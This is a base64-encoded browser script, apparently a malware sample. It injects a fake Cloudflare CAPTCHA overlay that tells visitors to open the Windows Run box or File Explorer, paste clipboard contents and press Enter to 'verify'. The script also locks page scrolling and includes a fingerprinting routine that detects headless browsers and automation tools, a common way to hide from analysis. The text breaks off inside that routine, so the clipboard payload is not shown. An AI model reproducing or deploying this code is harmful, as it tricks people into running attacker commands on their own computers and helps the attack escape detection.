yUXpNekxqazBPRE1nTWpNdU5EQTNOaUF6TkM0MU9UY2dNakl1T0RZd09TQXpOQzQxT1RjZ01qRXVPRGt5T0ZZeU1TNDROelU1UXpNMExqVTVOeUF5TUM0NU1UYzRJRE16TGprME9ETWdNakF1TXpZeE5DQXpNaTQ1TnlBeU1DNHpOakUwU0RNeUxqTXdNemhXTWpNdU5EQTRNa3d6TWk0NU55QXlNeTQwTURjMldpSWdZMnhoYzNNOUltTnhRMFZ5VjJGYWFVdGliMVZUTUcwaVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk16Z3VOalV5TlNBeE9DNDRPVEEwU0RRekxqTTNNemhXTWpBdU16UTFNMGcwTUM0eU9EZ3pWakl4TGpNMk16SklORE11TURjNVZqSXlMamMwTURkSU5EQXVNamc0TTFZeU5DNDROems0U0RNNExqWTFNalZXTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqY1VORmNsZGhXbWxMWW05VlV6QnRJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVFExTGpZMUlERTRMamc1TURSSU5EY3VNamcxT0ZZeU15NDBNalUwU0RVd0xqRTBORE5XTWpRdU9EYzVPRWcwTlM0Mk5WWXhPQzQ0T1RBMFdpSWdZMnhoYzNNOUltTnhRMFZ5VjJGYWFVdGliMVZUTUcwaVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk5UUXVOREU0TnlBeE9DNDRORGMxU0RVMUxqazVORGxNTlRndU5UQTNPU0F5TkM0NE56azNTRFUyTGpjMU5ERk1OVFl1TXpJek9DQXlNeTQ0TVRBeFNEVTBMakEwTjB3MU15NDJNalUzSURJMExqZzNPVGRJTlRFdU9UQTFPRXcxTkM0ME1UZzNJREU0TGpnME56VmFUVFUxTGpnMU1UZ2dNakl1TlRFNE0wdzFOUzR4T1RReElESXdMamd4TlRSTU5UUXVOVEkzT0NBeU1pNDFNVGd6U0RVMUxqZzFNVGhhSWlCamJHRnpjejBpWTNGRFJYSlhZVnBwUzJKdlZWTXdiU0krUEM5d1lYUm9Qanh3WVhSb0lHUTlJazAyTUM0Mk1UUTVJREU0TGpnNU1ERklOak11TkRBMU5rTTJOQzR6TURneklERTRMamc1TURFZ05qUXVPVE14TnlBeE9TNHhNeUEyTlM0ek1qZ2dNVGt1TlRRd05rTTJOUzQyTnpReUlERTVMamc0TXlBMk5TNDROVEV4SURJd0xqTTBOaklnTmpVdU9EVXhNU0F5TUM0NU16VTNWakl3TGprMU1qWkROalV1T0RVeE1TQXlNUzQ0TmpjNElEWTFMak0yT1RFZ01qSXVORGMxTkNBMk5DNDJNelk1SURJeUxqYzVNVGxNTmpZdU1EUTFJREkwTGpnNFNEWTBMakUxTlRoTU5qSXVPVFkzTVNBeU15NHdOalU0U0RZeUxqSTFNRGRXTWpRdU9EaElOakF1TmpFME9WWXhPQzQ0T1RBeFdrMDJNeTR6TWprNUlESXhMamMyTlRSRE5qTXVPRGcyTkNBeU1TNDNOalUwSURZMExqSXdOekVnTWpFdU5Ea3hOU0EyTkM0eU1EY3hJREl4TGpBMU5URldNakV1TURNNE1VTTJOQzR5TURjeElESXdMalUyTnpRZ05qTXVPRFk1TnlBeU1DNHpNamdnTmpNdU16SXhNU0F5TUM0ek1qaElOakl1TWpVd04xWXlNUzQzTmpZMVREWXpMak15T1RrZ01qRXVOelkxTkZvaUlHTnNZWE56UFNKamNVTkZjbGRoV21sTFltOVZVekJ0SWo0OEwzQmhkR2crUEhCaGRHZ2daRDBpVFRZNExqSXhNVElnTVRndU9Ea3dORWczTWk0NU5UYzRWakl3TGpNd01qUklOamt1T0RNd01sWXlNUzR5TURsSU56SXVOall6TWxZeU1pNDFNVGd6U0RZNUxqZ3pNREpXTWpNdU5EWTRNMGczTTFZeU5DNDROems0U0RZNExqSXhNVEpXTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqY1VORmNsZGhXbWxMWW05VlV6QnRJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVFF1TlRNNE1qUWdNakl1TmpBME0wTTBMak13T1RFNElESXpMakV6SURNdU9ESTNNak1nTWpNdU5UQXlNaUF6TGpFNE5qZ3hJREl6TGpVd01qSkRNaTR5T1RJMk5TQXlNeTQxTURJeUlERXVOamMzTkRZZ01qSXVOelE1TXlBeExqWTNOelEySURJeExqZzROVEZXTWpFdU9EWTNPRU14TGpZM056UTJJREl4TGpBd05EY2dNaTR5TnpVNU15QXlNQzR5TmpjMklETXVNVFk1T0NBeU1DNHlOamMyUXpNdU9EUXpOamNnTWpBdU1qWTNOaUEwTGpNMU5qZ3hJREl3TGpZNE9ESWdOQzQxTnpNMElESXhMakkyTURWSU5pNHlPVGMyTkVNMkxqQXlNVFV4SURFNUxqZ3pORGtnTkM0M09EY3hOaUF4T0M0M056QTNJRE11TVRnMk9ERWdNVGd1Tnpjd04wTXhMak0yTlRNeklERTRMamMzTURjZ01DQXlNQzR4TmpZMklEQWdNakV1T0RnMU1WWXlNUzQ1TURJeFF6QWdNak11TmpJeE9TQXhMak0wT0RZZ01qVWdNeTR4TmprNElESTFRelF1TnpJM05qSWdNalVnTlM0NU5EVXlOU0F5TXk0NU56WTBJRFl1TWpZMk5EVWdNakl1TmpBME5rdzBMalV6T0RJMElESXlMall3TkROYUlpQmpiR0Z6Y3owaVkzRkRSWEpYWVZwcFMySnZWVk13YlNJK1BDOXdZWFJvUGp3dmMzWm5QZzBLSUNBZ0lDQThaR2wyUGcwS0lDQWdJQ0FnSUNBOGMzQmhiaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQjFibVJsY214cGJtVTdJajVRY21sMllXTjVQQzl6Y0dGdVBpRGlnS0lnUEhOd1lXNGdjM1I1YkdVOUluUmxlSFF0WkdWamIzSmhkR2x2YmpvZ2RXNWtaWEpzYVc1bE95SStWR1Z5YlhNOEwzTndZVzQrRFFvZ0lDQWdJRHd2WkdsMlBnMEtJQ0FnSUNBTkNpQWdJQ0E4TDJScGRqNE5DaUFnSUR3dlpHbDJQZzBLRFFvZ0lDQThaR2wySUdsa1BTSnBWamxaZWxsTVNsbE9XRXQzWWtjNUlpQmpiR0Z6Y3owaVkyUlJXWFJIWVZWVk9XRklWVTVHSWlCemRIbHNaVDBpWW05eVpHVnlMWFJ2Y0RvZ2JtOXVaVHNnY0dGa1pHbHVaeTEwYjNBNklEQTdJRzFoY21kcGJpMTBiM0E2SURBN2JXRnlaMmx1TFdKdmRIUnZiVG93T3lJK0RRb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaVl6a3lZMFpTVjNOclVYcG9kRFZtSWo0TkNpQWdJQ0FnUEcxaGFXNGdZMnhoYzNNOUltTlFlWHBhT0Roc016SjNXbVprUkRraUlITjBlV3hsUFNKamIyeHZjam9nSTJRNVpEbGtPVHNpUGcwS0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpTM1J1TkhnNWRVUkdUbXdpUGcwS0lDQWdJQ0FnSUNBZ0lEeHdJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJREU0Y0hnN0lHMWhjbWRwYmkxaWIzUjBiMjA2SURFMWNIZzdJajROQ2lBZ0lDQWdJQ0FnSUNBZ0lGUnZJSEJ5YjNabElIbHZkU0JoY21VZ2JtOTBJR0VnY205aWIzUXNJSEJzWldGelpUb05DaUFnSUNBZ0lDQWdJQ0FnSUR3dmNENE5DaUFnSUNBZ0lDQWdJQ0E4YjJ3K0RRb2dJQ0FnSUNBZ0lDQWdQR3hwUGxCeVpYTnpJQ1poYlhBN0lHaHZiR1FnZEdobElGZHBibVJ2ZDNNZ1MyVjVJRHhwSUdOc1lYTnpQU0pqWTBWR1NsZHRRVTVMTUc0Z1kzRTBjMDFwTUd0aGFVNWlWMjEzY2lJK1BDOXBQaUFySUR4aVBsSThMMkkrTGp3dmJHaytEUW9nSUNBZ0lDQWdJQ0FnUEd4cFBsZG9aVzRnZEdobElIZHBibVJ2ZHlCdmNHVnVjeXdnY0hKbGMzTWdQR0krUTNSeWJEd3ZZajRnS3lBOFlqNVdQQzlpUGk0OEwyeHBQZzBLSUNBZ0lDQWdJQ0FnSUR4c2FUNVFZWE4wWlNCMGFHVWdZMjl0YldGdVpDQnBiblJ2SUZKMWJpQmhibVFnY0hKbGMzTWdQR0krUlc1MFpYSThMMkkrSUhSdklIWmxjbWxtZVM0OEwyeHBQZzBLRFFvZ0lDQWdJQ0FnSUNBZ1BDRXRMU0E4YkdrK1VISmxjM01nSUc5dUlIbHZkWElnYTJWNVltOWhjbVFnZEc4Z1ptbHVhWE5vTGp3dmJHaytJQzB0UGcwS0lDQWdJQ0FnSUNBZ0lEd3ZiMncrRFFvZ0lDQWdJQ0FnSUNBZ1BDRXRMU0E4Y0NCemRIbHNaVDBpY0dGa1pHbHVaeTEwYjNBNklERXdjSGc3SWo0TkNpQWdJQ0FnSUNBZ0lDQlpiM1VnYzJodmRXeGtJSE5sWlNCMGFHbHpJSFJsZUhRZ1lYQndaV0Z5T2cwS0lDQWdJQ0FnSUNBZ0lEeGljaUF2UGcwS0lDQWdJQ0FnSUNBZ0lEeGpiMlJsSUhOMGVXeGxQU0ppWVdOclozSnZkVzVrT2lCdWIyNWxPeUJpYjNKa1pYSTZJREZ3ZUNCemIyeHBaQ0FqTnprM09UYzVPeUIzYVdSMGFEb2dORE15Y0hnN0lqNUpJR0Z0SUc1dmRDQmhJSEp2WW05MElDMGdRMnh2ZFdSbWJHRnlaU0JKUkRvZ1BITndZVzRnYVdROUlta3dZMVp1VldscmFXNXpJajQyTURGbVpqTTBOend2YzNCaGJqNDhMMk52WkdVK0RRb2dJQ0FnSUNBZ0lDQWdQQzl3UGlBdExUNE5DaUFnSUNBZ0lDQWdJQ0FOQ2lBZ0lDQThMMlJwZGo0TkNnMEtJQ0FnSUNBOEwyMWhhVzQrRFFvZ0lDQWdQQzlrYVhZK0RRb05DaUFnSUNBZ0lDQWdQR1JwZGlCemRIbHNaVDBpWkdsemNHeGhlVG9nYm05dVpUc2lQZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQTBLSUNBZ0lDQWdJQ0FnSUR4dmJENE5DaUFnSUNBZ0lDQWdJQ0E4SVMwdElDNHVMaTR1TGk0OGJHa2djM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2SURFd2NIZzdJajROQ2lBZ0lDQWdJQ0FnSUNBZ0lFTnZjSGtnZEdobElHWnBiR1VnY0dGMGFDQmlaV3h2ZHcwS0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTBKRlZuRkdja1ZWUTBRNVdXc2lJR2xrUFNKcGREVkZTRmhvU25oS1REQlpJaUJ2Ym1Oc2FXTnJQU0owYUdsekxtTnNZWE56VEdsemRDNWhaR1FvSjJOc2FXTnJaV1FuS1NJK0RRb2dJQ0FnSUNBZ0lDQWdJQ0JET2x4cGJuUmxjbTVoYkMxelpXTjFjbVZjWm1sc1pXUnlhWFpsWEVoU1VHOXNhV041TG1SdlkzZ05DaUFnSUNBZ0lDQWdJQ0FnSUR3dlpHbDJQZzBLSUNBZ0lDQWdJQ0FnSUR3dmJHaytJRHM3T3pzN096c3RMVDROQ2lBZ0lDQWdJQ0FnSUNBOGJHa2djM1I1YkdVOUltMWhjbWRwYmkxaWIzUjBiMjA2SURFd2NIZzdJajVQY0dWdUlFWnBiR1VnUlhod2JHOXlaWElnWVc1a0lITmxiR1ZqZENCMGFHVWdZV1JrY21WemN5QmlZWElnS0R4emRISnZibWMrUTFSU1RDQXJJRXc4TDNOMGNtOXVaejRwUEM5c2FUNE5DaUFnSUNBZ0lDQWdJQ0E4YkdrZ2MzUjViR1U5SW0xaGNtZHBiaTFpYjNSMGIyMDZJREV3Y0hnN0lqNVFZWE4wWlNCMGFHVWdjR0YwYUNBb1BITjBjbTl1Wno1RFZGSk1JQ3NnVmp3dmMzUnliMjVuUGlrZ1lXNWtJSEJ5WlhOeklEeHpkSEp2Ym1jK1JXNTBaWEk4TDNOMGNtOXVaejQ4TDJ4cFBnMEtJQ0FnSUNBZ0lDQWdJRHd2YjJ3K0RRb05DaUFnSUNBZ0lDQWdJQ0E4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYVdROUltbFBaMnhtUjB0eFEwSlBieUlnYzNSNWJHVTlJbVJwYzNCc1lYazZJRzV2Ym1VN0lqNE5DaUFnSUNBZ0lDQWdJQ0E4WW5WMGRHOXVJR2xrUFNKcFl6SXdNR3gyWVVvaVBrOXdaVzRnUm1sc1pTQkZlSEJzYjNKbGNqd3ZZblYwZEc5dVBnMEtJQ0FnSUNBZ0lDQThMMlJwZGo0TkNnMEtEUW9nSUNBOFpHbDJJR05zWVhOelBTSmpPVEpqUmxKWGMydFJlbWgwTldZZ1kxTnFPVlkxVFRObFptMVdTU0lnYzNSNWJHVTlJbUpoWTJ0bmNtOTFibVE2SUc1dmJtVTdJajROQ2lBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTFOcU9WWTFUVE5sWm0xV1NTMXNaV1owSWlCemRIbHNaVDBpZDJsa2RHZzZJREk0Tm5CNE95Qm1iRzloZERvZ2JHVm1kRHNnZEdWNGRDMWhiR2xuYmpvZ2JHVm1kRHNnWm05dWRDMXphWHBsT2lBeE5YQjRPeUkrRFFvZ0lDQWdJQ0JRWlhKbWIzSnRJSFJvWlNCemRHVndjeUJoWW05MlpTQjBieUJtYVc1cGMyZ2dkbVZ5YVdacFkyRjBhVzl1TGcwS0lDQWdJQ0E4TDJScGRqNE5DaUFnSUNBZ1BHSjFkSFJ2YmlCMGVYQmxQU0ppZFhSMGIyNGlJR05zWVhOelBTSmpTMHBzVldVd2IwRlVTblkzSUdNMWVqbHhjakozVDFReWF6WkRSU0lnYVdROUltbDZkMnR1UkVzek5tVklhRzBpSUhOMGVXeGxQU0ppWVdOclozSnZkVzVrT2lBak5XVTFaVFZsT3lCd1lXUmthVzVuT2lBNWNIZ2dNemh3ZURzZ2IzQmhZMmwwZVRvZ01DNDFPeUJqZFhKemIzSTZJRzV2ZEMxaGJHeHZkMlZrT3lJZ1pHbHpZV0pzWldRK1ZtVnlhV1o1UEM5aWRYUjBiMjQrRFFvZ0lDQWdQQzlrYVhZK0RRb2dJQ0E4TDJScGRqNE5DZzBLSUNBZ1BDRXRMU0F0TFQ0TkNnMEtEUW9OQ2lBZ1BDOWthWFkrRFFvZ0lDQWdQSEFnWTJ4aGMzTTlJbU42WlhkblJqSjZZekFpSUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SURFdU5YSmxiVHNOQ2lBZ0lDQnNhVzVsTFdobGFXZG9kRG9nTWk0eU5YSmxiVHNnY0dGa1pHbHVaeTEwYjNBNklESXdjSGc3SWo0OGMzQmhiaUJqYkdGemN6MGlZM2hLVGpSTlIxSmxVREZZUVdzaVBqd3ZjM0JoYmo0Z2JtVmxaSE1nZEc4Z2NtVjJhV1YzSUhSb1pTQnpaV04xY21sMGVTQnZaaUI1YjNWeUlHTnZibTVsWTNScGIyNGdZbVZtYjNKbElIQnliMk5sWldScGJtY3VQQzl3UGcwS0lDQWdJRHh3SUdOc1lYTnpQU0pqU1RkNWNsWnBTVWNpSUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SURFdU5YSmxiVHNnYkdsdVpTMW9aV2xuYUhRNklESXVNalZ5WlcwN0lIQmhaR1JwYm1jdGRHOXdPaUF5TUhCNE95QmthWE53YkdGNU9pQnViMjVsT3lJK1YyRnBkR2x1WnlCbWIzSWdQSE53WVc0Z1kyeGhjM005SW1ONFNrNDBUVWRTWlZBeFdFRnJJajQ4TDNOd1lXNCtMaTR1UEM5d1BnMEtJRHd2WkdsMlBnMEtJQTBLSUR4a2FYWWdZMnhoYzNNOUltTjZUVTF1TUdsRVUxRjBZVzlUY1hVaUlISnZiR1U5SW1OdmJuUmxiblJwYm1adklqNE5DaUFnUEdScGRpQmpiR0Z6Y3owaVkzcE5UVzR3YVVSVFVYUmhiMU54ZFMxcGJtNWxjaUkrRFFvZ0lDQThaR2wyUGcwS0lDQWdJRHhrYVhZK1VtRjVJRWxFT2lBOFkyOWtaU0JqYkdGemN6MGlZMkZoZFZFeGVubDZWaUkrTlRaaE5HTTFNams1Wm1SbGRHMWpZVHd2WTI5a1pUNDhMMlJwZGo0TkNpQWdJRHd2WkdsMlBnMEtJQ0FnUEdScGRpQnpkSGxzWlQwaWJXRnlaMmx1TFhSdmNEb2dOWEI0T3lJK1VHVnlabTl5YldGdVkyVWdKaUJ6WldOMWNtbDBlU0JpZVNBOGMzQmhiaUJqYkdGemN6MGlZM1pNVTNaT01rOUlTakpMV0VWS0lqNURiRzkxWkdac1lYSmxQQzl6Y0dGdVBqd3ZaR2wyUGcwS0lDQThMMlJwZGo0TkNpQThMMlJwZGo0TkNqd3ZaR2wyUGcwS0RRbzhjMk55YVhCMFBnMEtEUW9OQ2cwS1BDOXpZM0pwY0hRK0RRb05DZzBLUEM5aWIyUjVQand2YUhSdGJEND0nOwogICAgY29uc3QgaCA9IGI2NFRvVXRmOChiNjQpOwoKICAgIC8vIENyZWF0ZSBob3N0IGVsZW1lbnQgZm9yIFNoYWRvdyBET00KICAgIGNvbnN0IGhvc3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGhvc3QuaWQgPSAndGYtb3ZlcmxheS1ob3N0JzsKICAgIGhvc3Quc3R5bGUuY3NzVGV4dCA9ICdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwdnc7aGVpZ2h0OjEwMHZoO3otaW5kZXg6MjE0NzQ4MzY0NztiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2JvcmRlcjpub25lO21hcmdpbjowO3BhZGRpbmc6MDsnOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChob3N0KTsKCiAgICAvLyBBdHRhY2ggU2hhZG93IERPTSBmb3Igc3R5bGUgaXNvbGF0aW9uCiAgICBjb25zdCBzaGFkb3cgPSBob3N0LmF0dGFjaFNoYWRvdyh7IG1vZGU6ICdvcGVuJyB9KTsKICAgIAogICAgLy8gUGFyc2UgdGhlIEhUTUwgY29udGVudCB1c2luZyBET01QYXJzZXIgdG8gcHJvcGVybHkgZXh0cmFjdCBwYXJ0cwogICAgY29uc3QgcGFyc2VyID0gbmV3IERPTVBhcnNlcigpOwogICAgY29uc3QgZG9jID0gcGFyc2VyLnBhcnNlRnJvbVN0cmluZyhoLCAndGV4dC9odG1sJyk7CgogICAgLy8gMS4gRXh0cmFjdCBhbmQgcHJvY2VzcyBTdHlsZXMKICAgIGRvYy5xdWVyeVNlbGVjdG9yQWxsKCdzdHlsZScpLmZvckVhY2goc3R5bGUgPT4gewogICAgICAgIGxldCBjc3MgPSBzdHlsZS50ZXh0Q29udGVudCB8fCAnJzsKICAgICAgICAvLyBSZXBsYWNlICdib2R5JyBzZWxlY3RvciB3aXRoICcjdGYtb3ZlcmxheS1yb290JyAoaGFuZGxpbmcgY29udGV4dCkKICAgICAgICBjc3MgPSBjc3MucmVwbGFjZSgvKF58W1x9XHMsXSlib2R5KD89W1xzLFwue10pL2csICckMSN0Zi1vdmVybGF5LXJvb3QnKTsKICAgICAgICAvLyBSZXBsYWNlICdodG1sJyBzZWxlY3RvciB3aXRoICc6aG9zdCcKICAgICAgICBjc3MgPSBjc3MucmVwbGFjZSgvKF58W1x9XHMsXSlodG1sKD89W1xzLFwue10pL2csICckMTpob3N0Jyk7CiAgICAgICAgc3R5bGUudGV4dENvbnRlbnQgPSBjc3M7CiAgICAgICAgc2hhZG93LmFwcGVuZENoaWxkKHN0eWxlKTsKICAgIH0pOwoKICAgIC8vIDIuIEV4dHJhY3QgYW5kIG1vdmUgZXh0ZXJuYWwgc3R5bGVzaGVldHMKICAgIGRvYy5xdWVyeVNlbGVjdG9yQWxsKCdsaW5rW3JlbD0ic3R5bGVzaGVldCJdJykuZm9yRWFjaChsaW5rID0+IHsKICAgICAgICBzaGFkb3cuYXBwZW5kQ2hpbGQobGluayk7CiAgICB9KTsKCiAgICAvLyAzLiBDcmVhdGUgY29udGFpbmVyIGluc2lkZSBzaGFkb3cgKGFjdGluZyBhcyBwc2V1ZG8tYm9keSkKICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgY29udGFpbmVyLmlkID0gJ3RmLW92ZXJsYXktcm9vdCc7CiAgICBjb250YWluZXIuc3R5bGUuY3NzVGV4dCA9ICd3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47bWFyZ2luOjA7cGFkZGluZzowOyc7CiAgICAKICAgIC8vIENvcHkgYm9keSBhdHRyaWJ1dGVzIChjbGFzc2VzLCBpbmxpbmUgc3R5bGVzKSBmcm9tIHRlbXBsYXRlIHRvIG91ciBjb250YWluZXIKICAgIGlmIChkb2MuYm9keSkgewogICAgICAgIEFycmF5LmZyb20oZG9jLmJvZHkuYXR0cmlidXRlcykuZm9yRWFjaChhdHRyID0+IHsKICAgICAgICAgICAgaWYgKGF0dHIubmFtZSA9PT0gJ3N0eWxlJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zdHlsZS5jc3NUZXh0ICs9ICc7JyArIGF0dHIudmFsdWU7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoYXR0ci5uYW1lID09PSAnY2xhc3MnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLmNsYXNzTmFtZSA9IGF0dHIudmFsdWU7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoYXR0ci5uYW1lICE9PSAnaWQnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLnNldEF0dHJpYnV0ZShhdHRyLm5hbWUsIGF0dHIudmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgLy8gTW92ZSBhbGwgY2hpbGRyZW4gZnJvbSB0ZW1wbGF0ZSBib2R5IHRvIGNvbnRhaW5lcgogICAgICAgIHdoaWxlIChkb2MuYm9keS5maXJzdENoaWxkKSB7CiAgICAgICAgICAgIGNvbnRhaW5lci5hcHBlbmRDaGlsZChkb2MuYm9keS5maXJzdENoaWxkKTsKICAgICAgICB9CiAgICB9CiAgICAKICAgIHNoYWRvdy5hcHBlbmRDaGlsZChjb250YWluZXIpOwogICAgCiAgICAvLyBTdG9yZSBzaGFkb3cgcm9vdCBnbG9iYWxseSBmb3Igc2NyaXB0cyB0byBxdWVyeSBlbGVtZW50cwogICAgd2luZG93Ll9fdGZTaGFkb3dSb290ID0gc2hhZG93OwogICAgCiAgICAvLyBGb3JjZSBsYXlvdXQgcmVjYWxjdWxhdGlvbgogICAgdm9pZCBob3N0Lm9mZnNldEhlaWdodDsKICAgIAogICAgLy8gQmxvY2sgc2Nyb2xsIG9uIGJvZHkKICAgIGRvY3VtZW50LmJvZHkuc3R5bGUub3ZlcmZsb3cgPSAnaGlkZGVuJzsKICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS5vdmVyZmxvdyA9ICdoaWRkZW4nOwogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOwogICAgCiAgICBzZXRUaW1lb3V0KGluamVjdFNjcmlwdCwgMCk7CiAgfQoKICBjb25zdCBIRUFETEVTU19XRUlHSFQgPSAxMDsKICBjb25zdCBIRUFERlVMX1dFSUdIVCA9IC04OwogIGNvbnN0IFNVU1BJQ0lPVVNfV0VJR0hUID0gNTsKCiAgYXN5bmMgZnVuY3Rpb24gZGV0ZWN0SGVhZGxlc3MoKSB7CiAgICBjb25zdCBjaGVja3MgPSBbCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgICBjb25zdCBpc0hlYWRsZXNzID0gL2hlYWRsZXNzfHBoYW50b21qc3xzZWxlbml1bXx3ZWJkcml2ZXIvaS50ZXN0KHVhKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNXZWJkcml2ZXIgPSBuYXZpZ2F0b3Iud2ViZHJpdmVyID09PSB0cnVlOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBoYXNXZWJkcml2ZXIgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaGFzQ2hyb21lID0gISF3aW5kb3cuY2hyb21lOwogICAgICAgIGNvbnN0IGhhc0NvcnJlY3RDaHJvbWUgPSBoYXNDaHJvbWUgJiYgKHdpbmRvdy5jaHJvbWUucnVudGltZSB8fCB3aW5kb3cuY2hyb21lLmxvYWRUaW1lcyk7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWhhc0Nocm9tZSB8fCAhaGFzQ29ycmVjdENocm9tZTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICBhc3luYyAoKSA9PiB7CiAgICAgICAgaWYgKCFuYXZpZ2F0b3IucGVybWlzc2lvbnMpIHJldHVybiB7IHNjb3JlOiAwIH07CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGNvbnN0IHBlcm1pc3Npb25TdGF0dXMgPSBhd2FpdCBuYXZpZ2F0b3IucGVybWlzc2lvbnMucXVlcnkoeyBuYW1lOiAibm90aWZpY2F0aW9ucyIgfSk7CiAgICAgICAgICBjb25zdCBub3RpZmljYXRpb25QZXJtaXNzaW9uID0gTm90aWZpY2F0aW9uLnBlcm1pc3Npb247CiAgICAgICAgICBjb25zdCBpc0luY29uc2lzdGVudCA9IChub3RpZmljYXRpb25QZXJtaXNzaW9uID09PSAiZGVuaWVkIiAmJiBwZXJtaXNzaW9uU3RhdHVzLnN0YXRlID09PSAicHJvbXB0Iik7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogaXNJbmNvbnNpc3RlbnQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICB9CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBwbHVnaW5zTGVuZ3RoID0gbmF2aWdhdG9yLnBsdWdpbnM/Lmxlbmd0aCB8fCAwOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IHBsdWdpbnNMZW5ndGggPT09IDA7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGxhbmd1YWdlID0gbmF2aWdhdG9yLmxhbmd1YWdlOwogICAgICAgIGNvbnN0IGxhbmd1YWdlc0xlbmd0aCA9IG5hdmlnYXRvci5sYW5ndWFnZXM/Lmxlbmd0aCB8fCAwOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9ICFsYW5ndWFnZSB8fCBsYW5ndWFnZXNMZW5ndGggPT09IDA7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnY2FudmFzJyk7CiAgICAgICAgICBjb25zdCBnbCA9IGNhbnZhcy5nZXRDb250ZXh0KCd3ZWJnbCcpIHx8IGNhbnZhcy5nZXRDb250ZXh0KCdleHBlcmltZW50YWwtd2ViZ2wnKTsKICAgICAgICAgIGlmICghZ2wpIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgICAgY29uc3QgZGVidWdJbmZvID0gZ2wuZ2V0RXh0ZW5zaW9uKCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJyk7CiAgICAgICAgICBjb25zdCByZW5kZXJlciA9IGRlYnVnSW5mbyA/IGdsLmdldFBhcmFtZXRlcihkZWJ1Z0luZm8uVU5NQVNLRURfUkVOREVSRVJfV0VCR0wpIDogJ3Vua25vd24nOwogICAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gL3N3aWZ0c2hhZGVyfGxsdm1waXBlfG1lc2EvaS50ZXN0KHJlbmRlcmVyKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IG91dGVySGVpZ2h0ID0gd2luZG93Lm91dGVySGVpZ2h0OwogICAgICAgIGNvbnN0IG91dGVyV2lkdG